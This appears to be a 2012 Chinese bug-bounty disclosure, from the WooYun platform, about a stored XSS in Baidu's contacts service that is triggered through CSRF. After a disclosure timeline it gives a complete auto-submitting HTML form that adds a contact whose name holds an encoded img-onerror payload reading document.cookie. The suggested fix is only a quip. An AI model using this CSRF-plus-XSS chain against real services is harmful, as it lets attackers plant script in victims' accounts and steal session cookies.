漏洞详情 披露状态：   									2012-09-18：	细节已通知厂商并且等待厂商处理中									2012-09-18：	厂商已经确认，细节仅向厂商公开									2012-09-28：	细节向核心白帽子及相关领域专家公开									2012-10-08：	细节向普通白帽子公开									2012-10-18：	细节向实习白帽子公开									2012-11-02：	细节向公众公开  简要描述： 百度通讯录xss 详细说明：  一个yy型的xss通过csrf利用。<html><form accept-charset="utf-8" method="POST" action="http://tongxunlu.baidu.com/rest/2.0/pim/contacts?method=add&app_id=20" name="form0"><input id='param' type="hidden" name="param" value="%7B%22list%22%3A%5B%7B%22dn%22%3A%2212%3Cimg%20src%3D1%20onerror%3Dalert%28document.cookie%29%20%2F%3E3%22%2C%22tel%22%3A%5B%7B%22tp%22%3A%22c%22%2C%22num%22%3A%22123%22%7D%5D%2C%22em%22%3A%5B%7B%22tp%22%3A%22h%22%2C%22ma%22%3A%22123%22%7D%5D%2C%22org%22%3A%5B%7B%22tp%22%3A%22c%22%2C%22name%22%3A%22123%22%7D%5D%2C%22im%22%3A%5B%7B%22prt%22%3A%22qq%22%2C%22num%22%3A%22123%22%7D%5D%2C%22event%22%3A%5B%7B%22tp%22%3A%22b%22%2C%22time%22%3A%22123%22%7D%5D%2C%22luid%22%3A1%2C%22lctime%22%3A1347637278216%2C%22lmtime%22%3A1347637278216%7D%5D%7D"/><script type="text/javascript">document.getElementById('param').value=decodeURIComponent(document.getElementById('param').value);document.form0.submit();</script></form></body></html>   漏洞证明：  

   修复方案：  百度下。   版权声明：转载请注明来源 不懂xx@乌云
